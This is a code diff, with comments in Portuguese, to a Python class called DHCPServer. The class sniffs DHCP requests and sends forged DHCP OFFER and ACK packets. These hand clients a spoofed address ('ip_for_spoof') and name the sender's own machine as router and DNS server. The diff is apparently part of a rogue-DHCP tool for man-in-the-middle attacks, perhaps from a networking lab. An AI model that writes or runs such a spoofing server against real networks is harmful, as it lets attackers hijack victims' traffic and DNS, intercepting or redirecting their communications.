@@ -96,6 +96,7 @@ class DHCPServer:
                     dest_port = struct.unpack('!H', udp_header[2:4])[0]
                     if dest_port == 67:  # Porta do servidor DHCP
                         self.log_dhcp_request(packet)
+                        self.read_buffer[:] = packet  # Salva o pacote capturado
                         return packet
                     elif dest_port == 53:  # Porta DNS
                         self.log_dns_request(packet)
@@ -103,17 +104,16 @@ class DHCPServer:
                         return packet
 
     # Método para construir uma oferta DHCP
-    def build_dhcp_offer(self, dst_addr):
+    def build_dhcp_offer(self, client_mac, transaction_id):
         print("Construindo uma oferta DHCP!")
         self.write_buffer = bytearray(SEND_BUFFSIZE)
 
         # Ethernet header
-        client_mac = self.read_buffer[6:12]  # Endereço MAC do cliente
         struct.pack_into('!6s6sH', self.write_buffer, 0, client_mac, self.mac_address, ETHER_TYPE_IPv4)
 
         # IP header
         src_ip = struct.unpack("!I", socket.inet_aton(self.ip_str))[0]
-        dst_ip = struct.unpack("!I", socket.inet_aton(dst_addr))[0]
+        dst_ip = struct.unpack("!I", socket.inet_aton(self.ip_for_spoof))[0]
         ip_header = struct.pack('!BBHHHBBHII',
                                 0x45, 0, 336, 0, 0, 16, 17, 0, src_ip, dst_ip)
         checksum = in_cksum(ip_header)
@@ -125,8 +125,8 @@ class DHCPServer:
 
         # DHCP header
         dhcp_header = struct.pack('!BBBBIHHIIII16s192s4s',
-                                2, 1, 6, 0, struct.unpack('!I', self.read_buffer[42:46])[0], 0, 0, 0, 0, dst_ip, 0,
-                                self.read_buffer[6:12], b'\x00' * 192, b'\x63\x82\x53\x63')
+                                2, 1, 6, 0, transaction_id, 0, 0, 0, 0, dst_ip, 0,
+                                client_mac, b'\x00' * 192, b'\x63\x82\x53\x63')
         self.write_buffer[42:282] = dhcp_header
 
         # DHCP options
@@ -165,9 +165,54 @@ class DHCPServer:
         send_sockfd.close()
 
     # Método para construir um ACK DHCP
-    def build_dhcp_ack(self):
+    def build_dhcp_ack(self, client_mac, transaction_id):
         print("Construindo um ACK DHCP!")
-        self.write_buffer[282 + 6] = DHCP_ACK
+        self.write_buffer = bytearray(SEND_BUFFSIZE)
+
+        # Ethernet header
+        struct.pack_into('!6s6sH', self.write_buffer, 0, client_mac, self.mac_address, ETHER_TYPE_IPv4)
+
+        # IP header
+        src_ip = struct.unpack("!I", socket.inet_aton(self.ip_str))[0]
+        dst_ip = struct.unpack("!I", socket.inet_aton(self.ip_for_spoof))[0]
+        ip_header = struct.pack('!BBHHHBBHII',
+                                0x45, 0, 336, 0, 0, 16, 17, 0, src_ip, dst_ip)
+        checksum = in_cksum(ip_header)
+        struct.pack_into('!BBHHHBBHII', self.write_buffer, 14, 0x45, 0, 336, 0, 0, 16, 17, checksum, src_ip, dst_ip)
+
+        # UDP header
+        udp_header = struct.pack('!HHHH', 67, 68, 0x13c, 0)
+        self.write_buffer[34:42] = udp_header
+
+        # DHCP header
+        dhcp_header = struct.pack('!BBBBIHHIIII16s192s4s',
+                                5, 1, 6, 0, transaction_id, 0, 0, 0, 0, dst_ip, 0,
+                                client_mac, b'\x00' * 192, b'\x63\x82\x53\x63')
+        self.write_buffer[42:282] = dhcp_header
+
+        # DHCP options
+        options = [
+            (53, 1, [DHCP_ACK]),
+            (54, 4, struct.unpack('!4B', struct.pack('!I', self.ip_int))),
+            (1, 4, [255, 255, 255, 0]),
+            (51, 4, [0, 1, 56, 128]),
+            (3, 4, struct.unpack('!4B', struct.pack('!I', self.ip_int))),
+            (6, 4, struct.unpack('!4B', struct.pack('!I', self.ip_int))),
+            (28, 4, [255, 255, 255, 255]),
+            (255,)
+        ]
+        offset = 282
+        for opt in options:
+            self.write_buffer[offset] = opt[0]
+            offset += 1
+            if len(opt) > 1:
+                self.write_buffer[offset] = opt[1]
+                offset += 1
+                for byte in opt[2]:
+                    self.write_buffer[offset] = byte
+                    offset += 1
+        self.write_buffer[offset] = 0xff
+
         self.log_dhcp_response()
 
     # Método para registrar uma solicitação DHCP
@@ -238,11 +283,16 @@ class DHCPServer:
     # Método principal para executar o servidor DHCP
     def run(self):
         print("Iniciando servidor DHCP...")
-        self.sniff()
-        self.build_dhcp_offer(self.ip_for_spoof)
+        packet = self.sniff()
+        client_mac = packet[6:12]
+        transaction_id = struct.unpack('!I', packet[42:46])[0]
+        # O IP oferecido ao cliente será o IP de spoofing
+        self.build_dhcp_offer(client_mac, transaction_id)
         self.send_write_buffer()
-        self.sniff()
-        self.build_dhcp_ack()
+        packet = self.sniff()
+        client_mac = packet[6:12]
+        transaction_id = struct.unpack('!I', packet[42:46])[0]
+        self.build_dhcp_ack(client_mac, transaction_id)
         self.send_write_buffer()
         print("Servidor DHCP finalizado.")
 
